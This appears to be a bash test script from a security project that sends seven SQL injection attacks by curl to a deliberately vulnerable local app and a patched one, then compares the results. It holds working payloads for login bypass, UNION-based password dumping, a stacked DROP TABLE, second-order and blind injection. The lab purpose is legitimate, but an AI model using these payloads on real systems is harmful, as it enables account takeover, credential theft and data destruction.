#!/bin/bash
# SQL Injection Attack Script using curl
# As specified in project proposal

VULNERABLE_URL="${1:-http://localhost:5000}"
PATCHED_URL="${2:-http://localhost:5001}"

echo "========================================================================"
echo "SQL Injection Attack Scripts (curl-based)"
echo "========================================================================"
echo "Vulnerable App: $VULNERABLE_URL"
echo "Patched App: $PATCHED_URL"
echo ""

# Test 1: Authentication Bypass
echo "========================================================================"
echo "TEST 1: Authentication Bypass with ' OR '1'='1"
echo "========================================================================"

echo ""
echo "[VULNERABLE APP]"
response=$(curl -s -w "\n%{http_code}" -X POST "$VULNERABLE_URL/api/login" \
  -d "username=' OR '1'='1&password=anything")

http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | sed '$d')

if echo "$body" | grep -q '"success":true' || [ "$http_code" == "302" ]; then
    echo "✗ VULNERABLE: Login bypass successful!"
    echo "Response: $body" | head -c 200
else
    echo "✓ PROTECTED: Attack blocked"
    echo "Response: $body" | head -c 200
fi

echo ""
echo "[PATCHED APP]"
response=$(curl -s -w "\n%{http_code}" -X POST "$PATCHED_URL/api/login" \
  -d "username=' OR '1'='1&password=anything")

http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | sed '$d')

if echo "$body" | grep -q '"success":true' || [ "$http_code" == "302" ]; then
    echo "✗ VULNERABLE: Login bypass successful!"
else
    echo "✓ PROTECTED: Attack blocked"
fi

# Test 2: UNION SELECT Data Exfiltration
echo ""
echo "========================================================================"
echo "TEST 2: UNION SELECT Data Exfiltration"
echo "========================================================================"

# First login as alice
echo ""
echo "Logging in as alice to both apps..."
curl -s -c /tmp/cookies_vuln.txt -X POST "$VULNERABLE_URL/api/login" \
  -d "username=alice&password=password123" > /dev/null

curl -s -c /tmp/cookies_patched.txt -X POST "$PATCHED_URL/api/login" \
  -d "username=alice&password=password123" > /dev/null

echo ""
echo "[VULNERABLE APP] Testing UNION SELECT:"
response=$(curl -s -b /tmp/cookies_vuln.txt \
  "$VULNERABLE_URL/api/search?query=%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%20email%20FROM%20users%20--")

if echo "$response" | grep -q "admin_secret\|password123"; then
    echo "✗ VULNERABLE: Data exfiltration successful! Passwords exposed:"
    echo "$response" | grep -o '"password":"[^"]*"' | head -3
else
    echo "✓ PROTECTED: Data exfiltration blocked"
fi

echo ""
echo "[PATCHED APP] Testing UNION SELECT:"
response=$(curl -s -b /tmp/cookies_patched.txt \
  "$PATCHED_URL/api/search?query=%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%20email%20FROM%20users%20--")

if echo "$response" | grep -q "admin_secret\|password123"; then
    echo "✗ VULNERABLE: Data exfiltration successful!"
else
    echo "✓ PROTECTED: Data exfiltration blocked"
fi

# Test 3: Comment-based Bypass
echo ""
echo "========================================================================"
echo "TEST 3: Comment-based Password Bypass (admin'--)"
echo "========================================================================"

echo ""
echo "[VULNERABLE APP]"
response=$(curl -s -X POST "$VULNERABLE_URL/api/login" \
  -d "username=admin'--&password=wrong_password")

if echo "$response" | grep -q '"success":true'; then
    echo "✗ VULNERABLE: Comment bypass successful!"
else
    echo "✓ PROTECTED: Attack blocked"
fi

echo ""
echo "[PATCHED APP]"
response=$(curl -s -X POST "$PATCHED_URL/api/login" \
  -d "username=admin'--&password=wrong_password")

if echo "$response" | grep -q '"success":true'; then
    echo "✗ VULNERABLE: Comment bypass successful!"
else
    echo "✓ PROTECTED: Attack blocked"
fi

# Test 4: Stacked Statements
echo ""
echo "========================================================================"
echo "TEST 4: Stacked Statements SQL Injection"
echo "========================================================================"

echo ""
echo "Logging in for stacked statement test..."
curl -s -c /tmp/cookies_vuln.txt -X POST "$VULNERABLE_URL/api/login" \
  -d "username=alice&password=password123" > /dev/null

curl -s -c /tmp/cookies_patched.txt -X POST "$PATCHED_URL/api/login" \
  -d "username=alice&password=password123" > /dev/null

echo ""
echo "[VULNERABLE APP] Testing stacked statement (DROP TABLE):"
response=$(curl -s -b /tmp/cookies_vuln.txt -X POST "$VULNERABLE_URL/api/bulk_delete" \
  -d "username=alice'; DROP TABLE users; --")

if echo "$response" | grep -q '"success":true' && echo "$response" | grep -q "query"; then
    echo "✗ VULNERABLE: Stacked statement executed!"
    echo "$response" | grep -o '"query":"[^"]*"'
else
    echo "✓ PROTECTED: Stacked statement blocked"
fi

echo ""
echo "[PATCHED APP] Testing stacked statement:"
response=$(curl -s -b /tmp/cookies_patched.txt -X POST "$PATCHED_URL/api/bulk_delete" \
  -d "username=alice'; DROP TABLE users; --")

if echo "$response" | grep -q '"success":true' && echo "$response" | grep -q "DROP"; then
    echo "✗ VULNERABLE: Stacked statement executed!"
else
    echo "✓ PROTECTED: Stacked statement blocked"
fi

# Test 5: Second-Order SQL Injection
echo ""
echo "========================================================================"
echo "TEST 5: Second-Order SQL Injection"
echo "========================================================================"

echo ""
echo "[VULNERABLE APP] Stage 1 - Saving malicious display name:"
response=$(curl -s -b /tmp/cookies_vuln.txt -X POST "$VULNERABLE_URL/api/save_preference" \
  -d "display_name=admin' OR '1'='1' --&theme=dark")

echo "Preferences saved: $(echo "$response" | grep -q '"success":true' && echo "Yes" || echo "No")"

echo ""
echo "[VULNERABLE APP] Stage 2 - Triggering stored payload:"
response=$(curl -s -b /tmp/cookies_vuln.txt "$VULNERABLE_URL/api/get_user_stats")

user_count=$(echo "$response" | grep -o '"user_count":[0-9]*' | grep -o '[0-9]*')

if [ "$user_count" -gt "1" ] 2>/dev/null; then
    echo "✗ VULNERABLE: Second-order SQLi successful! Retrieved $user_count users instead of 1"
    echo "$response" | grep -o '"query":"[^"]*"'
else
    echo "✓ PROTECTED: Second-order SQL injection blocked"
fi

echo ""
echo "[PATCHED APP] Testing second-order SQLi:"
curl -s -b /tmp/cookies_patched.txt -X POST "$PATCHED_URL/api/save_preference" \
  -d "display_name=admin' OR '1'='1' --&theme=dark" > /dev/null

response=$(curl -s -b /tmp/cookies_patched.txt "$PATCHED_URL/api/get_user_stats")

user_count=$(echo "$response" | grep -o '"user_count":[0-9]*' | grep -o '[0-9]*')

if [ "$user_count" -gt "1" ] 2>/dev/null; then
    echo "✗ VULNERABLE: Second-order SQLi successful!"
else
    echo "✓ PROTECTED: Second-order SQL injection blocked"
fi

# Test 6: Boolean-Based Blind SQL Injection
echo ""
echo "========================================================================"
echo "TEST 6: Boolean-Based Blind SQL Injection"
echo "========================================================================"

echo ""
echo "[VULNERABLE APP] Testing TRUE condition (admin' AND '1'='1):"
response_true=$(curl -s "$VULNERABLE_URL/api/check_username?username=admin%27%20AND%20%271%27%3D%271")
available_true=$(echo "$response_true" | grep -o '"available":[^,}]*' | grep -o 'true\|false')

echo "[VULNERABLE APP] Testing FALSE condition (admin' AND '1'='2):"
response_false=$(curl -s "$VULNERABLE_URL/api/check_username?username=admin%27%20AND%20%271%27%3D%272")
available_false=$(echo "$response_false" | grep -o '"available":[^,}]*' | grep -o 'true\|false')

if [ "$available_true" != "$available_false" ]; then
    echo "✗ VULNERABLE: Different responses for TRUE/FALSE - Blind SQLi possible!"
    echo "  TRUE condition: available=$available_true"
    echo "  FALSE condition: available=$available_false"
else
    echo "✓ PROTECTED: Same response for TRUE/FALSE - Blind SQLi prevented"
fi

echo ""
echo "[PATCHED APP] Testing boolean-based blind SQLi:"
response_true=$(curl -s "$PATCHED_URL/api/check_username?username=admin%27%20AND%20%271%27%3D%271")
available_true=$(echo "$response_true" | grep -o '"available":[^,}]*' | grep -o 'true\|false')

response_false=$(curl -s "$PATCHED_URL/api/check_username?username=admin%27%20AND%20%271%27%3D%272")
available_false=$(echo "$response_false" | grep -o '"available":[^,}]*' | grep -o 'true\|false')

if [ "$available_true" != "$available_false" ]; then
    echo "✗ VULNERABLE: Blind SQLi possible!"
else
    echo "✓ PROTECTED: Blind SQLi prevented"
fi

# Test 7: Time-Based Blind SQL Injection
echo ""
echo "========================================================================"
echo "TEST 7: Time-Based Blind SQL Injection (Basic Test)"
echo "========================================================================"

echo ""
echo "[VULNERABLE APP] Testing time-based blind SQLi (may take several seconds):"
start_time=$(date +%s.%N)
response=$(curl -s --max-time 10 "$VULNERABLE_URL/api/verify_user?username=%27%20OR%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%20randomblob%28100000000%29%20ELSE%201%20END%29%20--")
end_time=$(date +%s.%N)
elapsed=$(echo "$end_time - $start_time" | bc 2>/dev/null || echo "N/A")

if [ "$elapsed" != "N/A" ] && (( $(echo "$elapsed > 1" | bc -l 2>/dev/null) )); then
    echo "✗ VULNERABLE: Time-based blind SQLi possible! Query took ${elapsed}s"
else
    echo "✓ Response time: ${elapsed}s (normal)"
fi

echo ""
echo "[PATCHED APP] Testing time-based blind SQLi:"
start_time=$(date +%s.%N)
response=$(curl -s --max-time 10 "$PATCHED_URL/api/verify_user?username=%27%20OR%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%20randomblob%28100000000%29%20ELSE%201%20END%29%20--")
end_time=$(date +%s.%N)
elapsed=$(echo "$end_time - $start_time" | bc 2>/dev/null || echo "N/A")

if [ "$elapsed" != "N/A" ] && (( $(echo "$elapsed > 1" | bc -l 2>/dev/null) )); then
    echo "✗ VULNERABLE: Time-based blind SQLi possible!"
else
    echo "✓ PROTECTED: Time-based blind SQLi prevented (${elapsed}s)"
fi

# Cleanup
rm -f /tmp/cookies_*.txt

echo ""
echo "========================================================================"
echo "Testing Complete! (7 Attack Vectors Tested)"
echo "========================================================================"
echo "Attack Vectors:"
echo "  1. Authentication Bypass"
echo "  2. UNION SELECT Data Exfiltration"
echo "  3. Comment-based Bypass"
echo "  4. Stacked Statements"
echo "  5. Second-Order SQL Injection"
echo "  6. Boolean-Based Blind SQLi"
echo "  7. Time-Based Blind SQLi"
echo ""
echo "Expected Results:"
echo "  - Vulnerable app: All attacks should succeed (✗)"
echo "  - Patched app: All attacks should be blocked (✓)"
echo "========================================================================"
